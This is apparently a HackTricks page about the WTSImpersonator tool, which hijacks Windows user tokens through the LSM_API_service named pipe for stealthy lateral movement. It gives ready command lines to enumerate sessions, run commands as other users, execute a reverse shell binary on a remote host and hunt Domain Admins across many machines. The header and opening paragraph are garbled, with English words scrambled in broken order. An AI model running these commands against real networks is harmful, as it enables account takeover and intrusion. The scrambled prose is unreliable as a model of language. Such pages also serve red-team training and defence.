<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>!</strong></a> <strong>tlhIngan Hol</strong></summary>

**HackTricks** yIlo' **tlhIngan Hol**:

* **tlhIngan Hol** **HackTricks** **tlhIngan Hol** **pdf** **download** **'ej** **HackTricks** **advertised** **company** **want** **'oH** **SUBSCRIPTION PLANS** **[**ghItlh**](https://github.com/sponsors/carlospolop)** **Check**!
* **PEASS & HackTricks swag** **[**official PEASS & HackTricks swag**](https://peass.creator-spring.com)** **Get**
* **The PEASS Family** **[**The PEASS Family**](https://opensea.io/collection/the-peass-family)** **Discover**, **exclusive NFTs** **[**NFTs**](https://opensea.io/collection/the-peass-family)** **our collection** **[**NFTs**](https://opensea.io/collection/the-peass-family)**
* **Join** 💬 **Discord group** **[**Discord group**](https://discord.gg/hRep4RUj7f)** **telegram group** **[**telegram group**](https://t.me/peass)** **follow** **Twitter** 🐦 **[**@carlospolopm**](https://twitter.com/hacktricks_live)**.
* **Share** **hacking tricks** **PRs** **submitting** **HackTricks** **[**HackTricks**](https://github.com/carlospolop/hacktricks)** **HackTricks Cloud** **[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)** **github repos**.

</details>

**WTS Impersonator** **tool** **"\\pipe\LSM_API_service"** **RPC Named pipe** **exploits** **logged-in users** **enumerate** **stealthily** **tokens** **hijack** **traditional Token Impersonation techniques** **bypassing**. **networks** **within** **lateral movements** **seamless** **facilitates**. **technique** **behind** **innovation** **Omri Baso**, **work** **accessible** **[**GitHub**](https://github.com/OmriBaso/WTSImpersonator)** **credited**.

### **Core Functionality**
**API calls** **sequence** **tool** **operates**:
```powershell
WTSEnumerateSessionsA → WTSQuerySessionInformationA → WTSQueryUserToken → CreateProcessAsUserW
```
### Key Modules and Usage
- **Enumerating Users**: Local and remote user enumeration is possible with the tool, using commands for either scenario:
- Locally:
```powershell
.\WTSImpersonator.exe -m enum
```
- Remotely, by specifying an IP address or hostname:
```powershell
.\WTSImpersonator.exe -m enum -s 192.168.40.131
```

- **Executing Commands**: The `exec` and `exec-remote` modules require a **Service** context to function. Local execution simply needs the WTSImpersonator executable and a command:
- Example for local command execution:
```powershell
.\WTSImpersonator.exe -m exec -s 3 -c C:\Windows\System32\cmd.exe
```
- PsExec64.exe can be used to gain a service context:
```powershell
.\PsExec64.exe -accepteula -s cmd.exe
```

- **Remote Command Execution**: Involves creating and installing a service remotely similar to PsExec.exe, allowing execution with appropriate permissions.
- Example of remote execution:
```powershell
.\WTSImpersonator.exe -m exec-remote -s 192.168.40.129 -c .\SimpleReverseShellExample.exe -sp .\WTSService.exe -id 2
```

- **User Hunting Module**: Targets specific users across multiple machines, executing code under their credentials. This is especially useful for targeting Domain Admins with local admin rights on several systems.
- Usage example:
```powershell
.\WTSImpersonator.exe -m user-hunter -uh DOMAIN/USER -ipl .\IPsList.txt -c .\ExeToExecute.exe -sp .\WTServiceBinary.exe
```


<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Other ways to support HackTricks:

* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
